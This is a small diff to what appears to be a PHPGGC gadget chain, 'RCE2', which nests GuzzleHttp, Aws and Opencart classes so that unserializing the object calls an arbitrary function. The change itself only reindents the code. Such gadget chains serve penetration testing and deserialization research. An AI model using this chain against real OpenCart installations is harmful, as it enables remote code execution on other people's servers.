@@ -16,9 +16,9 @@ class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
         $parameter = $parameters['parameter'];
 
         return new \GuzzleHttp\Handler\CurlFactory(
-          new \Aws\ResultPaginator(
-            new \Opencart\System\Engine\Proxy('getCommand', $function),
-                $parameter
+            new \Aws\ResultPaginator(
+                new \Opencart\System\Engine\Proxy('getCommand', $function),
+                    $parameter
           ),
         );
     }
